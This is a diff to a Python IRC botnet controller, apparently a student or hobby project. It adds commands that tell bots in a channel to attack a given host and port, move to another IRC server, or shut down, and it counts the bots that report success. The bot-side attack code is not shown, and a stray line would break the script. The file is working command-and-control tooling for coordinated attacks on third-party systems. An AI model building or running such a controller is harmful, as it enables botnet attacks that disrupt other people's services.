@@ -4,7 +4,8 @@ import sys
 import random
 import select
 
-ERROR_FLAG = -1
+ERROR_FLAG = -1	
+	
 
 #connection info
 irc = ""
@@ -41,6 +42,7 @@ def cmd_status():
 	#except somerror:
 		#con_active = False
 	
+	
 #tells the bots to attack the hostname
 def cmd_attack(hostname, port):
 	send("PRIVMSG " + channel +" :"+"attack "+ hostname + " " + port +"\n")
@@ -62,8 +64,6 @@ def cmd_attack(hostname, port):
 			successes.append(bot)
 		elif status == "failure":
 			failures.append(bot)
-			
-		
 	print("Successful attack bots: " + str(len(successes)))
 	print(str(successes))
 	print("Failed attacking bots: " + str(len(failures)))
@@ -71,11 +71,10 @@ def cmd_attack(hostname, port):
 	return
 
 
-
 #move bots from current irc to new irc
-def cmd_move(hostname, port, channel):
+def cmd_move(hostname, port, chan):
 	#instructs bots to disconnect from current irc and move to another one
-	send("PRIVMSG " + channel +" :"+"move "+ hostname + " " + port + " " + channel + "\n")
+	send("PRIVMSG " + channel +" :"+"move "+ hostname + " " + port + " " + chan + "\n")
 	#bots send a message back to controller telling if success or not  
 	msg = ""
 	while msg == "":
@@ -94,8 +93,6 @@ def cmd_move(hostname, port, channel):
 			successes.append(bot)
 		elif status == "failure":
 			failures.append(bot)
-			
-		
 	print("Successfully moved bots: " + str(len(successes)))
 	print(str(successes))
 	print("Failed moving bots: " + str(len(failures)))
@@ -104,13 +101,34 @@ def cmd_move(hostname, port, channel):
 
 
 #controller will disconnect from the bots and terminate
-def cmd_quit():	
+def cmd_quit():
+	global active
+	send("QUIT")
+	active = False	
 	return
 
 #this kills the bot(s)
 def cmd_shutdown():
+	send("PRIVMSG " + channel +" "+"shutdown"+"\n")
+	msg = ""
+	bot_names = []
+	numbots = 0
+	while msg == "":
+		time.sleep(1)
+		msg = rcv_irc_response()
+		msg = msg.strip()
+	msgs = msg.split("\n")
+	for line in msgs:
+		bot_status = (line[line.find(':', 1)+1:] + "\n").strip()
+		bot_status = bot_status.split()
+		bot = bot_status[0]
+		status = bot_status[1]
+		if status == "shutdown":
+			bot_names.append(bot)
+	print("Total: "+str(len(bot_names))+" bots shut down")
 	return
 
+s
 #wait for a user to send command to the irc needs error checking
 def get_command():
 	msg = input("command> ")
@@ -127,6 +145,7 @@ def send(msg):
 		#con_active = False
 	return
 	
+	
 #receive a command from the controller TO DO parsing needed and error checking
 def rcv_irc_response():
 	#try:
@@ -136,6 +155,7 @@ def rcv_irc_response():
 		return "Ping pong conflict"
 	else:		
 		return msg
+
 
 #connect to the specified IRC server and channel
 def connect(host, port):
@@ -153,6 +173,7 @@ def connect(host, port):
 	send("NICK " + nick + "\n")
 	send("JOIN " + channel + "\n")
 	return 
+
 
 #handle the connection to the IRC server
 def handle_connection():
@@ -197,9 +218,6 @@ def handle_connection():
 			elif s == irc:			
 				msg = irc.recv(1024).decode()
 				send('PONG ' + msg.split()[1] + '\r\n')
-				
-			#else ping pong	
-
 		
 
 	return
